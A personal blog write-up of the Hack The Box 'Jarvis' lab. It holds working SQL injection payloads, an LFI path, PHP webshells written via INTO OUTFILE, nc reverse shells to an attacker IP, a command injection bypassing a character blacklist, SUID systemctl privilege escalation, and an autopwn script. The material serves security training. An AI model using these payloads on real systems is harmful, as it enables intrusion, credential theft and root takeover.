---
layout: post
title:  "Jarvis Writeup - Hack The Box"
date:   2025-08-23
desc: ""
keywords: "HTB,eWPT,Linux,SQLi,Cracking,phpMyAdmin LFI Exploitaition,SQLi to RCE,Sudoers Abuse,Command Injection,SUID Abuse,Medium"
categories: [HTB]
tags: [HTB,eWPT,Linux,SQLi,Cracking,phpMyAdmin LFI Exploitaition,SQLi to RCE,Sudoers Abuse,Command Injection,SUID Abuse,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I start another day of practice on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform and I confront a very interesting box, which has some complexity as it was rated as **Medium** by much of the community, and allowed me to remember, improve, practice techniques that I am always using in different laboratories. I loved the combination of misconfigurations, vulnerabilities that I had to exploit to engage the **Jarvis** box. Finding the attack vectors took me a lot of time and I was also able to practice in community my scripting to automate some phases of the **Engagement**. Now I just have to access **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** to spawn the machine and start my writeups.

<br /><br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm already improving my methodology every time I start a new challenge, so I start the most crucial phase of a Pentest or a lab, the **Reconnaissance** phase. But before starting everything, I will confirm that I already have connectivity with the machine by sending a trace whith `ping`, then I use the tool developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, `whichSystem.py`, to get a good idea of the **OS** installed on the box. Now that everything is correct, I can use `nmap` to list the open ports and with its custom scripts (written in **LUA**) I can leak information about the services I'm going to have to investigate to try to compromise. The great thing about the `nmap` scripts is that I also get the versions of the services, which allows me to look for vulnerabilities, plus with all this information I find the **codename** of the machine - in case they differ for different versions, it is an indication that containers are being deployed. With `whatweb` from my console and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** from the browser I manage to disclose the technology stack behind the web application available on port **80**, where I find a domain and deprecated version information but nothing substantial at the moment.

```bash
ping -c 2 10.10.10.143
whichSystem.py 10.10.10.143
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.143 -oG allPorts
nmap -sCV -p22,80 10.10.10.143 -oN targeted
cat targeted
#     OpenSSH 7.4p1 Debian 10+deb9u6
#     google.es --> OpenSSH 7.4p1 10+deb9u6 launchpad     Stretch
#     Apache httpd 2.4.25
#     google.es --> Apache httpd 2.4.25 launchpad         Stretch

whatweb http://10.10.10.143
# Email[supersecurehotel@logger.htb]
# http://10.10.10.143/
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The web service represents a large attack surface for any pentester, so I focus my attention to make an accurate enumeration since the other service (**SSH**) always proves to be secure and very unlikely to be compromised. Some functionalities and pages are not developed but I find interesting information about the protocol and the method used when making a room reservation. As the **GET** method is used in the data transfer through the **URL**, I perform some basic tests to check if the server is vulnerable to **[IDOR](https://portswigger.net/web-security/access-control/idor){:target="_blank"}** or **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}**. After investing time, researching different **SQLi** techniques and even resorting to trial and error, I succeed in finding a **SQLi vulnerability**.

```html
http://10.10.10.143/dining-bar.php
http://10.10.10.143/rooms-suites.php
# IDOR, SQLi ?

http://10.10.10.143/room.php?cod=7
http://10.10.10.143/room.php?cod=0
# Redirect
http://10.10.10.143/room.php?cod=-1
# ?

http://10.10.10.143/room.php?cod=-1'
http://10.10.10.143/room.php?cod=-1' or sleep(5)-- -
http://10.10.10.143/room.php?cod=-1' and sleep(5)-- -
http://10.10.10.143/room.php?cod=-1 and sleep(5)-- -
http://10.10.10.143/room.php?cod=-1 order by 10-- -
http://10.10.10.143/room.php?cod=-1 order by 1-- -
# :(

http://10.10.10.143/room.php?cod=-1 union select 1-- -
...
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7-- -
# :)
```

<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I was able to find an attack vector through the **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** exploit, I will first leak information from the database management, do a reconnaissance of the available databases and look for those tables that may have information that will allow me to access the system. After several injections I find a cradential in the user table of the mysql database, which has a hashed password that I will immediately try to crack with an online tool.

```html
http://10.10.10.143/room.php?cod=-1 union select 1,@@version,user(),database(),5,6,7-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(schema_name),4,5,6,7 from information_schema.schemata-- -

http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema="hotel"-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room"-- -
# :(

http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(schema_name),4,5,6,7 from information_schema.schemata-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema="mysql"-- -

http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="mysql" and table_name="user"-- -

http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(User,0x3a,Password),4,5,6,7 from mysql.user-- -
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To get the password in clear text I always resort to the **[CrackStation](https://crackstation.net/){:target="_blank"}** tool, which uses massive lookup tables to crack password hashes and instantly get what I need. Unfortunately the password does not allow me to connect to the system through the **SSH** protocol, so I have to keep enumerating the web service. With `wfuzz` I perform a file and web directory dicovery, which gives me a result and it turns out to be from the **phpMyAdmin** database management. With an `nmap` script I can also perform a **fingerprint** of the web server and it leaks me the same hidden directory. I try to access the management dashboard with default credentials but it doesn't work, so I do a search for the version of this tool in the source code and find a possible candidate.

```bash
ssh DBadmin@10.10.10.143
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.143/FUZZ
nmap --script http-enum -p80 10.10.10.143 -oN webScan

# http://10.10.10.143/phpmyadmin/
# root:     :(

# view-source:http://10.10.10.143/phpmyadmin/
# 4.8.0
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

But with the credentials I have I can access the **phpMyAdmin** database managment **dashboard** and I corroborate that the version is the one I had found in the source code. With `searchsploit` I find an exploit in the **[ExploitDB](https://www.exploit-db.com/){:target="_blank"}** Local Database that would allow me to exploit a **LFI** in this version of the manager. In order not to download the exploit on my machine, I analyze the exploit code with `searchsploit` and I see that the exploit is simple so I'm going to perform a manual exploitation and as the results are successful I'm going to start leaking information from the system. First I get the list of all the users of the system and search in the personal directories of those accounts that have assigned a **bash** shell, some **SSH private key** or even to the first flag, but I don't succeed in any of my attempts.

```bash
# http://10.10.10.143/phpmyadmin/
# DBadmin:...     :)

searchsploit phpmyadmin 4.8
# phpMyAdmin 4.8.1 - Remote Code Execution (RCE)  php/webapps/50457.py
searchsploit -x php/webapps/50457.py
# ..."/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)

# http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

# http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../home/pepper/.ssh/id_rsa
# http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../home/pepper/user.txt
# Permission denied
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to access the system that I can think of is to use the MySql ***into outfile*** statement to upload a malicious file to the web server. In my first test I make sure to choose the correct database (**hotel**) and upload a text file successfully, then check that the file is hosted on the server when I access it from the browser. The next thing is to upload a **.php** file to validate two things, first that the **PHP code is interpreted correctly** and also that I can already **execute commands remotely**. I have already achieved my goal of getting an **RCE** so I can continue the engagement of the box.

```bash
# hotel --> SQL --> SELECT "oldboy was here" INTO OUTFILE "/var/www/html/test.txt"
# http://10.10.10.143/test.txt
# :)

# SELECT "<?php system('whoami'); ?>" INTO OUTFILE "/var/www/html/rce_test.php"
# http://10.10.10.143/rce_test.php
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have found a possible attack vector to try to access the system, I'm going to upload a **webshell** to the server to facilitate the **RCE**. Once again, I use the MySql **into outfile** statement to upload the malicious **.php** script and I can now execute commands from my browser, next I verify that connectivity from the target to my attacking machine **is allowed**, by sending a trace with `ping` and sniffing my network with `tcpdump` waiting for incoming packets. Finally I use a **[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** oneliner to catch the incoming reverse shell with `nc` on port **443** of my machine, on my first attempt the connection falls so I had to use the enhanced functionality of `nc` using the **-c** parameter. Finally I succeed to access the system and perform my first enumeration commands.

```bash
# SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"
# http://10.10.10.143/shell.php?cmd=whoami
# http://10.10.10.143/shell.php?cmd=hostname
# http://10.10.10.143/shell.php?cmd=hostname -I

tcpdump -i tun0 icmp -n
# http://10.10.10.143/shell.php?cmd=ping -c 2 10.10.14.3

nc -nlvp 443
# http://10.10.10.143/shell.php?cmd=nc -e bash 10.10.14.3 443
# http://10.10.10.143/shell.php?cmd=nc -c bash 10.10.14.3 443
# :)

whoami
hostname -I
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another way to access the system, without engaging **phpMyAdmin**, and that is to take advantage of the **SQLi** vulnerability. The first thing I can do is to use the **load_file** statement to read sensitive files from the system, in case there are protection measures, restrictions or problem in the use of special characters (**/**) I can encode in **hexadecimal** the absolute path of the file I want to access and the **SQL query** will interpret it correctly. The next thing is to resort to the **into outfile** statement to upload malicious files to the system, but I perform the necessary tests before uploading a **webshell**. I can now upload a **webshell** again to run an onliner to catch the incoming **reverse shell** with `nc` and access the system. I perform some enumeration commands (I confirm that the codename is **stretch**) but before continuing I perform a **console treatment**.

```bash
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -

echo "/etc/passwd" | tr -d '\n' | xxd -ps
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file(0x2f6574632f706173737764),4,5,6,7-- -
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/.ssh/id_rsa"),4,5,6,7-- -
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/proc/net/fib_trie"),4,5,6,7-- -
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/proc/net/tcp"),4,5,6,7-- -
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/user.txt"),4,5,6,7-- -
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/Desktop/user.txt"),4,5,6,7-- -

# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,"oldboy was here!",4,5,6,7 into outfile "/var/www/html/test2.txt"-- -
# http://10.10.10.143/test2.txt

# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,"<php echo 'testing php code'; ?>",4,5,6,7 into outfile "var/www/html/rce2.php"-- -
# http://10.10.10.143/rce2.php

# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,"<?php shell_exec($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/shell2.php"-- -
# http://10.10.10.143/shell2.php?cmd=whoami
# :(
# view-source:http://10.10.10.143/room.php?cod=-1 union select 1,2,"%3C?php system($_REQUEST['cmd']); ?%3E",4,5,6,7 into outfile "/var/www/html/shell3.php"-- -
# http://10.10.10.143/shell3.php?cmd=whoami
# :)

nc -nlvp 443
# http://10.10.10.143/shell3.php?cmd=nc -c bash 10.10.14.3 443

whoami
hostname -I
hostname
uname -a
lsb_release -a
# Codename:	stretch
id
groups

which python3
python3 -c "import pty;pty.spawn('/bin/bash')"
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After the console treatment I find a large amount of files that I generated in order to engage the system, so I'm going to delete them with `shred` to clean up my fingerprints a bit. I start the system **Enumeration** phase, I find some credentials but they match with the ones I already had, but something more interesting is that I have a special privilege that allows me to run a script developed in **Python** impersonating the user **pepper**. I could try **library hijacking**, but I don't have write permissions in the directory where the script is located, so I'm going to run it to understand its functionality. It has a help panel to guide me with the different options, I can access a log (<ins>where I find my SQLi !</ins>) but the most interesting thing is that I can send a trace to my attacking machine, it is very likely that a command (**ping**) is being executed.

> **Victime Machine**:

```bash
shred -zun 10 -v test.txt
...

cat connection.php
sudo -l
# (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
ls -l /var/www/Admin-Utilities/simpler.py
# owner: pepper
cat !$

python3
  import sys
  print(sys.path)
  exit()
cd /var/www/Admin-Utilities
touch test.txt
ls -l

python3 simpler.py
python3 simpler.py -s
python3 simpler.py -l
```

> **Attacker Machine**:

```bash
tcpdump -i tun0 icmp -n
```

> **Victime Machine**:

```bash
python3 simpler.py -p
# 10.10.14.3            Command Execution?
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I perform an analysis of the **simpler.py** script code and find the command that is executed, it is indeed `ping`, but what I can observe is that the only security measure or code sanitization is the existence of a **blacklist** of **special characters**. I'm going to run the program again and this time I'm going to inject a command to replace an **IP**, I can see on the screen the output of the same but for other commands where special characters like **‘-’** are needed the protection measure does not allow it, it is even impossible to use `nc` to get a **reverse shell** (without resorting to more sophisticated methods).

> **Victime Machine**:

```bash
cat simpler.py
# os.system('ping ' + command)

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
  $(whoami)

  $(/bin/bash)
  $(bash)
  whoami
  ls -la
```
> **Attacker Machine**:

```bash
nc -nlvp 443
```

> **Victimem Machine**:

```bash
which nc
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
  $(/bin/nc -e /bin/bash 10.10.14.3 443)
# :( Blacklisted
```

<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The easiest way to bypass the security restriction, or rather, to **avoid it**, is to create a malicious script that is responsible for sending the **Reverse Shell** and catch it with `nc` on port **443** of my attacking machine. I run again the **simpler.py** script but this time I inject a command where my malicious script is invoked and I get the connection without problems because the **"/"** is not included in the **blacklist**, now I just have to perform again the console treatment and continue the engagement. I can now access the first flag and I also find that the `systemctl` binary has the **SUID** bit enabled, a misconfiguration that I must investigate immediately.

> **Victime Machine**:

```bash
pushd /dev/shm/
touch reverse_shell.sh
nano !$
cat !$
```

> **reverse_shell.sh**:

```bash
#!/bin/bash

/bin/nc -e /bin/bash 10.10.14.3 443
```

```bash
chmod +x !$
ls -l !$
```

> **Attacker Machine**:

```bash
nc -nlvp 443
```

> **Victime Machine**:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
  $(bash /dev/shm/reverse_shell.sh)

whoami
hostname -I

script /dev/null -c bash
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

cd ~
id
groups
sudo -l
find \-perm -4000 2>/dev/null
# ./bin/systemctl
ls -l ./bin/systemctl
# -rwsr-x--- 1 root pepper 174520 Jun 29  2022 ./bin/systemctl      owner root, SUID bit
```

<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Whenever I find that a binary has **SUID** permissions and does not belong to the list that **Linux** sets by default, I turn to **[GTFObins](https://gtfobins.github.io/gtfobins/systemctl/){:target="_blank"}** to investigate if there is a way to exploit this misconfiguration. Indeed there is a way that would allow me to **escalate privileges**, I just have to create a **"special"** service in which I'm going to inject my malicious command (or rather my **malicious script** to send a **Reverse Shell**) in the **ExecStart** attribute, which refers to the command to be executed when the service is started. Finally with `systemctl` I start the malicious service, but the connection is not persistent, so I'm going to modify the script in charge of sending the **Reverse Shell**, and use the enhanced functionality of `nc` with the **"-c"** parameter to establish the connection correctly. I can now access the last flag and finish the engagement of the box.

> **Victime Machine**:

```bash
touch pwn3d.sh
nano !$
cat !$
```

> **pwn3d.sh**:

```bash
#!/bin/bash

nc -e bash 10.10.14.3 443
```

```bash
chmod +x pwn3d.sh
touch pwn3d.service
nano !$
cat !$
```

> **pwn3d.service**:

```
[Service]
Type=oneshot
ExecStart=/dev/shm/pwn3d.sh
[Install]
WantedBy=multi-user.target
```

> **Attacker Machine**:

```bash
nc -nlvp 443
```

> **Victime Machine**:

```bash
systemctl link /dev/shm/pwn3d.service
systemctl enable --now /dev/shm/pwn3d.service
# :(

nano pwn3d.sh
cat !$
# nc -c bash 10.10.14.3 443       -c parameter
```

> **Attacker Machine**:

```bash
nc -nlvp 443
```

> **Victime Machine**:

```bash
mv pwn3d.service pwn3d_0.service
systemctl link /dev/shm/pwn3d_0.service
systemctl enable --now /dev/shm/pwn3d_0.service

whoami
hostname
# :)
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Together with the **[hack4u](https://hack4u.io/){:target="_blank"}** community, we were able to create a tool written in **Python** that automates the first phase of **engagement** of the box. In my case, I had to solve some problems with deprecated libraries (**pwn**) that **Linux** would not allow me to install on the system, so I had to set up a virtual **Python** environment and then develop the tool. In order for the tool to succeed in achieving its objective, I took advantage of **SQLi** exploitation, so I only had to analyze the request sent to the server to find out the name of the script responsible for the logic related to room booking, as well as which parameters and data are sent. Once the scripting phase was complete, I was able to run the tool and obtain an **interactive shell**.

```bash
nvim autopwn.py
python3 autopwn.py
# No module named 'pwn'

pip3 install pwn
# error: externally-managed-environment
python3 -m venv ./
./bin/pip3 install pwn
cat autopwn.py
```

> **autopwn.py**:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, signal, time
import threading

def def_handler(sig,frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Global Variables
sqli_url = '''http://10.10.10.143/room.php?cod=-1 union select 1,2,"<?php system('nc -e /bin/bash 10.10.14.3 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"'''
rce_url = "http://10.10.10.143/reverse.php"
lport = 443

def makeRequest():

    r = requests.get(sqli_url)
    r = requests.get(rce_url)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

```bash
./bin/pip3 autopwn.py
```

<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another excellent machine from **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** where I was able to practice **SQLi** again, which always proves to be a wonderful technique for exploiting vulnerabilities found on the target machine. With each lab on this excellent platform, I'm refining my skills, but at the same time, I'm realizing that the field of **Information security** is **so vast** that I must always maintain this energy and desire to continue learning. I'm going to kill the **Jarvis** box and move on to the next lab.

<br /><br />
<img src="{{ site.img_path }}/jarvis_writeup/Jarvis_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
